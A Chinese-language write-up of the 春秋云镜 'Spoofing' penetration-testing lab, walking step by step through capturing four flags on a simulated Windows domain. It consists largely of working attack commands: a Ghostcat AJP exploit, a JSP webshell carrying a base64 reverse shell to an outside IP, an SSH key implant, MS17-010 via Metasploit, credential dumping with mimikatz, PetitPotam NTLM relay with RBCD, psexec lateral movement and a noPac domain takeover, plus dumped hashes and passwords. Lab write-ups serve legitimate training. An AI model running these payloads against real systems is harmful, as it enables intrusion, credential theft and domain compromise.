---
title: "春秋云镜 Spoofing"
onlyTitle: true
date: 2025-12-25 14:06:21
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png
---



## 春秋云镜 Spoofing

### flag1

fscan扫出8080开放

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224140600769.png)

dirsearch扫一遍目录

```sh
D:\ctf-tools\dirsearch>python dirsearch.py -u http://39.99.132.191:8080

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12293

Target: http://39.99.132.191:8080/

[14:06:25] Scanning:
[14:06:29] 200 -   114B - /404.html
[14:06:29] 200 -    7KB - /;json/
[14:06:29] 200 -    7KB - /;login/
[14:06:29] 200 -    7KB - /;admin/
[14:06:29] 400 -   795B - /a%5c.aspx
[14:06:36] 200 -    7KB - /console.html
[14:06:37] 302 -     0B - /css  ->  /css/
[14:06:37] 302 -     0B - /data  ->  /data/
[14:06:37] 302 -     0B - /docs  ->  /docs/
[14:06:37] 404 -   733B - /docs/export-demo.xml
[14:06:37] 404 -   731B - /docs/changelog.txt
[14:06:37] 404 -   732B - /docs/CHANGELOG.html
[14:06:37] 404 -   729B - /docs/_build/
[14:06:37] 404 -   746B - /docs/html/admin/ch01.html
[14:06:37] 404 -   749B - /docs/html/admin/ch01s04.html
[14:06:37] 404 -   749B - /docs/html/admin/ch03s07.html
[14:06:37] 404 -   750B - /docs/html/developer/ch02.html
[14:06:37] 404 -   753B - /docs/html/developer/ch03s15.html
[14:06:37] 404 -   730B - /docs/swagger.json
[14:06:37] 404 -   733B - /docs/maintenance.txt
[14:06:37] 404 -   730B - /docs/updating.txt
[14:06:37] 404 -   737B - /docs/html/index.html
[14:06:37] 404 -   747B - /docs/html/admin/index.html
[14:06:37] 302 -     0B - /download  ->  /download/
[14:06:37] 200 -   132B - /download/
[14:06:38] 302 -     0B - /examples  ->  /examples/
[14:06:38] 404 -   781B - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[14:06:38] 200 -    1KB - /examples/websocket/index.xhtml
[14:06:38] 200 -   658B - /examples/servlets/servlet/CookieExample
[14:06:38] 200 -   14KB - /examples/jsp/index.html
[14:06:38] 200 -    6KB - /examples/servlets/index.html
[14:06:38] 200 -  1010B - /examples/servlets/servlet/RequestHeaderExample
[14:06:38] 200 -   687B - /examples/jsp/snp/snoop.jsp
[14:06:39] 403 -    3KB - /host-manager/
[14:06:39] 403 -    3KB - /host-manager/html
[14:06:40] 302 -     0B - /images  ->  /images/
[14:06:40] 200 -    7KB - /index.html
[14:06:40] 302 -     0B - /js  ->  /js/
[14:06:41] 302 -     0B - /lib  ->  /lib/
[14:06:41] 302 -     0B - /manager  ->  /manager/
[14:06:41] 403 -    3KB - /manager/admin.asp
[14:06:41] 403 -    3KB - /manager/html
[14:06:41] 403 -    3KB - /manager/
[14:06:41] 403 -    3KB - /manager/html/
[14:06:41] 403 -    3KB - /manager/jmxproxy
[14:06:41] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[14:06:41] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[14:06:41] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[14:06:41] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[14:06:41] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[14:06:41] 403 -    3KB - /manager/jmxproxy/?qry=STUFF
[14:06:41] 403 -    3KB - /manager/login
[14:06:41] 403 -    3KB - /manager/VERSION
[14:06:41] 403 -    3KB - /manager/status/all
[14:06:41] 403 -    3KB - /manager/login.asp
[14:06:48] 403 -     0B - /upload
[14:06:48] 403 -     0B - /upload/
[14:06:48] 403 -     0B - /upload/1.php
[14:06:48] 403 -     0B - /upload/2.php
[14:06:48] 403 -     0B - /upload/b_user.csv
[14:06:48] 403 -     0B - /upload/test.php
[14:06:48] 403 -     0B - /upload/b_user.xls
[14:06:48] 403 -     0B - /upload/loginIxje.php
[14:06:48] 403 -     0B - /upload/test.txt
[14:06:48] 403 -     0B - /upload/upload.php
[14:06:48] 200 -    9KB - /user.html

Task Complete
```

有管理员路由

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224141002026.png)

有Tomcat信息（沟槽的校园网

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224141403941.png)

Tomcat 9.0.30

打CVE-2020-1938

如果目标的Tomcat进行了如下配置

```xml
<!-- 存在风险的 AJP 默认配置 -->
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
```

如果对外开放8009端口且未配置认证，攻击者可以直接利用AJP协议访问敏感文件。

[Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

可利用该脚本读文件、执行文件，唯独少了写文件

读web.xml，看下有没有可以写文件的地方

```sh
python ajpShooter.py http://39.99.132.191:8080 8009 /WEB-INF/web.xml read
```

得到web.xml，看下映射

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>

  <security-constraint>
    <display-name>Tomcat Server Configuration Security Constraint</display-name>
    <web-resource-collection>
      <web-resource-name>Protected Area</web-resource-name>
      <url-pattern>/upload/*</url-pattern>
    </web-resource-collection>
    <auth-constraint>
      <role-name>admin</role-name>
    </auth-constraint>
  </security-constraint>

  <error-page>
    <error-code>404</error-code>
    <location>/404.html</location>
  </error-page>

  <error-page>
    <error-code>403</error-code>
    <location>/error.html</location>
  </error-page>

  <error-page>
    <exception-type>java.lang.Throwable</exception-type>
    <location>/error.html</location>
  </error-page>

  <servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>com.example.HelloServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/HelloServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>LoginServlet</display-name>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>com.example.LoginServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/LoginServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>RegisterServlet</display-name>
    <servlet-name>RegisterServlet</servlet-name>
    <servlet-class>com.example.RegisterServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>RegisterServlet</servlet-name>
    <url-pattern>/RegisterServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>UploadTestServlet</display-name>
    <servlet-name>UploadTestServlet</servlet-name>
    <servlet-class>com.example.UploadTestServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>UploadTestServlet</servlet-name>
    <url-pattern>/UploadServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>DownloadFileServlet</display-name>
    <servlet-name>DownloadFileServlet</servlet-name>
    <servlet-class>com.example.DownloadFileServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>DownloadFileServlet</servlet-name>
    <url-pattern>/DownloadServlet</url-pattern>
  </servlet-mapping>
</web-app>
```



有个UploadServlet和DownloadServlet

利用UploadServlet上传jsp，再用ajpShooter.py去执行

```jsp
<%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzIuNzQuMTk3LzE5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
%>
```

文件上传到/upload/1add7602cac3ae8ffb7cef53175b9668/20251225042750597.txt

```
python ajpShooter.py http://39.99.158.142:8080/ 8009 /upload/1add7602cac3ae8ffb7cef53175b9668/20251225042750597.txt eval
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224143317442.png)

弹回来就是root权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224143431423.png)

flag01: flag{6470814a-3b4f-46d9-a9e8-bf3468863e82}



### flag2

写个ssh先

```
echo "ssh-rsa key" >> /root/.ssh/authorized_keys
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224143847648.png)

传gost和fscan上去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224144234513.png)

本机网段172.22.11.76/24

FScan结果：

```sh
[6.3s]     存活端口数量: 14
[6.3s]     开始漏洞扫描
[6.5s] [*] NetInfo 扫描结果
目标主机: 172.22.11.6
主机名: XIAORANG-DC
发现的网络接口:
   IPv4地址:
      └─ 172.22.11.6
[6.5s] [+] 172.22.11.26 CVE-2020-0796 SmbGhost Vulnerable
[6.5s] [*] NetInfo 扫描结果
目标主机: 172.22.11.26
主机名: XR-LCM3AE8B
发现的网络接口:
   IPv4地址:
      └─ 172.22.11.26
[6.5s] [*] NetInfo 扫描结果
目标主机: 172.22.11.45
主机名: XR-DESKTOP
发现的网络接口:
[6.5s] [+] NetBios 172.22.11.6     DC:XIAORANG\XIAORANG-DC    
[6.5s] [+] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          
[6.5s] [+] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[6.5s] [+] 发现漏洞 172.22.11.45 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010
[6.7s]     POC加载完成: 总共387个，成功387个，失败0个
[6.8s] [*] 网站标题 http://172.22.11.76:8080  状态码:200 长度:7091   标题:后台管理
[51.2s]     扫描已完成: 26/26
```

总结一下：

```
172.22.11.6 DC
172.22.11.26 XR-LCM3AE8B
172.22.11.45 MS17010
172.22.11.76 本机
```

gost出来先打MS 17010（windows msf真的好用，墙裂推荐！

```
gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/39.99.158.142:22 -F socks5://39.99.158.142:5555

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.11.45
exploit
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224145313637.png)

type C:\Users\Administrator\flag\flag02.txt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224145527407.png)

flag02: flag{eca97311-c98d-4529-a3ba-5d46033bb0f2}



### flag3

但是好像不能hashdump？hashdump到底要什么权限？？

噢没什么权限，后面我在linux上跑了一遍就能dump了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225173625429.png)

用kiwi导出一下域票据

```sh
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.
meterpreter > creds_all
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain    NTLM                              SHA1
--------     ------    ----                              ----
XR-DESKTOP$  XIAORANG  8ea4a61ca8c5ca289b8d77118ac56688  37e17d7c30632ddd6e54edb884d1a6cfaa9eea6f
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f

wdigest credentials
===================

Username     Domain    Password
--------     ------    --------
(null)       (null)    (null)
XR-DESKTOP$  XIAORANG  e9 75 bc f6 46 10 ae f3 87 19 91 a2 b8 6f 3f 0f 01 b1 5f 79 63 5b 16 a9 f0 6c ab 14 00 f9 65 aa fe b4 5b 83 f2 37 70 a6 2a 72 03 b
                       d 4c 57 e4 7c a1 33 77 55 7a 81 3d db cc a3 ae 34 a2 86 89 4b 4c f5 b3 ed 2e 3c 42 ab d4 38 60 ce 50 96 dc 8d 32 dc 49 ad 4a 9f be
                        91 cf f7 92 5f 7d 12 d5 a5 55 fa c7 9d 75 67 fb cb 16 cb 96 62 c9 3b f8 3f 1b 6e 2e e3 a3 21 33 98 9f 1a cb aa 2b 83 38 ec 96 02
                       bb 24 9d a6 1f 69 cf c9 c1 de 67 fb 49 ca 60 62 75 33 25 8e 22 25 35 9d bd a9 4b 70 11 e3 95 97 d0 05 02 18 33 da 16 80 b5 e6 0c 1
                       e 29 f4 1c 11 06 30 06 8e 20 8b 58 09 d4 4a 5b fd 78 7a 45 82 82 f1 71 9f 74 c6 53 c1 39 b2 fc 7e f3 42 6b b5 48 2d 9f b7 a2 50 6f
                        41 70 15 7a 26 f1 d0 f3 0b e7 f7 fe 38 0f 79 09 4c 27 a2 ea 87 08 76
yangmei      XIAORANG  xrihGHgoNZQ

kerberos credentials
====================

Username     Domain        Password
--------     ------        --------
(null)       (null)        (null)
xr-desktop$  XIAORANG.LAB  e9 75 bc f6 46 10 ae f3 87 19 91 a2 b8 6f 3f 0f 01 b1 5f 79 63 5b 16 a9 f0 6c ab 14 00 f9 65 aa fe b4 5b 83 f2 37 70 a6 2a 72
                           03 bd 4c 57 e4 7c a1 33 77 55 7a 81 3d db cc a3 ae 34 a2 86 89 4b 4c f5 b3 ed 2e 3c 42 ab d4 38 60 ce 50 96 dc 8d 32 dc 49 ad
                           4a 9f be 91 cf f7 92 5f 7d 12 d5 a5 55 fa c7 9d 75 67 fb cb 16 cb 96 62 c9 3b f8 3f 1b 6e 2e e3 a3 21 33 98 9f 1a cb aa 2b 83
                           38 ec 96 02 bb 24 9d a6 1f 69 cf c9 c1 de 67 fb 49 ca 60 62 75 33 25 8e 22 25 35 9d bd a9 4b 70 11 e3 95 97 d0 05 02 18 33 da
                           16 80 b5 e6 0c 1e 29 f4 1c 11 06 30 06 8e 20 8b 58 09 d4 4a 5b fd 78 7a 45 82 82 f1 71 9f 74 c6 53 c1 39 b2 fc 7e f3 42 6b b5
                           48 2d 9f b7 a2 50 6f 41 70 15 7a 26 f1 d0 f3 0b e7 f7 fe 38 0f 79 09 4c 27 a2 ea 87 08 76
xr-desktop$  XIAORANG.LAB  (null)
yangmei      XIAORANG.LAB  xrihGHgoNZQ


[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
meterpreter > 
```

有yangmei账号，还有XR-DESKTOP$ NTLM

```
yangmei      XIAORANG  xrihGHgoNZQ
```

常见的思路是用yangmei是域用户，按理说这里应该随便添加一个用户，然后rdp上去传SharpHound，然后横向到yangmei的号执行SharpHound

不过下一步的打法没见过，好像都没用SharpHound，就懒得搞这一套了

下一步的打法是打[NTLM Relay via WebDAV](https://cloud.tencent.com/developer/article/2267322?areaSource=102001.14&traceId=_iQlKVfB_eijDszgwHMVs)+Petitpotam

用cme或者crackmapexec打，wsl ubuntu里放个最新的cme文件即可

```
proxychains4 -q crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav
proxychains4 -q crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224161801836.png)

用高版本的kali会报错，因为python >= 3.12了，换成2023.4的kali就能顺利执行

26机子启动了webclient服务

26，45，6都开了PetitPotam

用`PetitPotam`强制让26访问我们的服务器，获取对应的TGT，再利用获取的TGT申请ST，进而对26横向

但是默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证

所以需要把目标80的流量代理出来，在本地用ntlmrelayx直接接收webclient附带的票据，获取TGT



上传socat到76服务器，把80的流量转发到vps的某个端口，因为webclient是通过80认证的

```sh
socat TCP-LISTEN:80,fork TCP:43.228.71.225:33539 &
socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:43.228.71.225:33539 &
lsof -i :80
```

结果不管用第一条还是第二条，vps都会说Address被用了，沟槽的阿里云盾啊

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251224170744853.png)

有阿里云盾占用80，玩不了好吧

>这里我第一次打的时候，80杀的只剩Aliyundun也显示端口被占用
>
>第二次打的时候，仍然有aliyundun，不过不会显示端口被占用了，而是经过了一次转发流量后，lsof显示已经有一个socat了，才会显示1被占用。把这个socat杀掉后就能顺利转发了。如果你的只有Aliyundun进程而不能转发流量，那你一定是和别人在一起打，可能你这里不能显示那个进程，实际上有个隐藏的socat，重启靶机或者叫你好朋友那边主动kill一下进程就能解决了，或者pkill -f socat把socat全杀了
>
>![20f3ef663e3726a02552c10c02331d5b](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20f3ef663e3726a02552c10c02331d5b.png)

带上nohup只是少了报错而已

可以用上面的直接转发到vps，可以用ssh先把目标79转发到本地的80，然后把目标的80转发到目标的79，这样就完成了把目标80的流量转发到本地的80

```sh
攻击机
ssh-keygen -t rsa -b 4096 
cat /root/.ssh/id_rsa.pub
靶机
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCisviqBEE/en955bzPBFIIrOoTjpCtMfJcoeeGrm0yltLnrhXUruxCb2abmvqjNOzMMQS4VX1+RsU0bh9nfM8EeSBM/QElzXV/fPMxSWpXWADrJCTlRIFPnMZa/FcEVuo4sXbjOiX6jMkREunlWMqBR69t5fuuyUpC46jNNyBwFXoSCQf0CZ4FK7mEv9GsHY/laBrSSGt6XQOOK/+G0PrZVloiP2XfAlWar3h9ctjST+ZuubE8QuYQexdD1+3cC8cxjB/gBYWg4G4LX0HoEvw63ZnLS7q3Pcz4it3+R7tVFC5Ow8Cw3sxVyOq8190HX+3rB93ijtma5AADLesSm8U7CJKu9t3/z/8qa0crPoDLvk+PYhiR/DC8MSXt9IlpJ92/mGHTDXPDJrjn35TTEUemdYN10NbvvEC2V6vgFiwTeo+Qs5c6lvBRCWEsinLKdBuxmPQoT2RTS0/JSUflOOiJw18oTOSTrJKkJgs8Gymyj7PIc8Z9mWU1E082bdw8O3gqfThwEfTwkjTt1115BCRVK3MdRF+FU7dfDPPh+/m8fRIpsViqN5EXR4BsoF6tCTvXztYlMLt7drh6Vdxk4mVxlAmseNiOGrAKQp+9bCo43+ykoJoBoIdhQZ+gZBgHBnaROwGnfz9x28bHwNh545ihYqgmfJpR+z4J+1m4lQIPMw== root@kali" >/root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

ssh -i ~/.ssh/id_rsa root@39.99.158.142 -R \*:79:127.0.0.1:80
socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
```

本地开启ntlmrelayx监听，用PetitPotam强制目标用webclient访问我们的监听

```sh
proxychains4 -q impacket-ntlmrelayx -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access
proxychains4 -q python PetitPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225170403085.png)

收到来自172.22.11.26认证的流量：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225170905756.png)

脚本运行完提示可以用XR-LCM3AE8B$打S4U2Proxy，也就是申请ST

打申请ST是何意味，那不就是打RBCD了吗，那PetitPotam的本质，就是修改了目标机器的的`msDS-AllowedToActOnBehalfOfOtherIdentity`

那下面就打RBCD

申请ST，这里的hash是前面creds_all dsump的域内票据

```
proxychains4 impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :8ea4a61ca8c5ca289b8d77118ac56688 xiaorang.lab/XR-Desktop$ -dc-ip 172.22.11.6
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225173903393.png)

现在我们本地有26 administrator的ccache了，横向上

```sh
export KRB5CCNAME=administrator@cifs_XR-LCM3AE8B.xiaorang.lab@XIAORANG.LAB.ccache
sudo vim /etc/hosts
#填入内容如下
172.22.11.26 XR-LCM3AE8B.xiaorang.lab

proxychains4 impacket-psexec -target-ip 172.22.11.26 -k XR-LCM3AE8B.xiaorang.lab -no-pass -code gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225174136987.png)

type C:\Users\Administrator\flag\flag03.txt

```
C:\windows\system32> type C:\Users\Administrator\flag\flag03.txt
   ___     _ __                      __     _              __ _  
  / __|   | '_ \   ___     ___      / _|   (_)    _ _     / _` | 
  \__ \   | .__/  / _ \   / _ \    |  _|   | |   | ' \    \__, | 
  |___/   |_|__   \___/   \___/   _|_|_   _|_|_  |_||_|   |___/  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

flag03: flag{2b55ea0d-02fb-4437-a673-4edcd79c8440}
```



### flag4

创建管理员用户

```
net user godown qwerQ!1234 /add

net localgroup administrators godown /add
```

rdp上去，上传mimikatz

注意到主机内有这些用户，zhanghui是域用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225180956367.png)

由于不是域用户，得返回windows shell dump票据

```
privilege::debug
sekurlsa::logonpasswords
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225175754152.png)

这个其实就是白银票据攻击，但是我们知道结果就行了，`sekurlsa::logonpasswords`是dump hash票据，具体怎么去dump的不用管

以管理员执行mimikatz

把mimikatz拖到system32文件夹就行了

```
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

```sh
c:\Users\godown\Desktop>mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 847707 (00000000:000cef5b)
Session           : RemoteInteractive from 2
User Name         : zhanghui
Domain            : XIAORANG
Logon Server      : XIAORANG-DC
Logon Time        : 2025/12/25 16:29:35
SID               : S-1-5-21-3598443049-773813974-2432140268-1133
        msv :
         [00000003] Primary
         * Username : zhanghui
         * Domain   : XIAORANG
         * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1
         * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65
         * DPAPI    : 4bfe751ae03dc1517cfb688adc506154
        tspkg :
        wdigest :
         * Username : zhanghui
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : zhanghui
         * Domain   : XIAORANG.LAB
         * Password : (null)
        ssp :
        credman :
        cloudap :


mimikatz(commandline) # exit
Bye!
```

抓到zhanghui用户的哈希1232126b24cdf8c9bd2f788a9d7c7ed1

下面打nopac https://xz.aliyun.com/t/10694

[GitHub - Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user](https://github.com/Ridter/noPac)

```
python noPac.py xiaorang.lab/zhanghui -hashes :1232126b24cdf8c9bd2f788a9d7c7ed1 -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251225183644907.png)

flag04: flag{c4a687d9-8e7f-4f86-922e-b16afabcdb74}





他在MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac
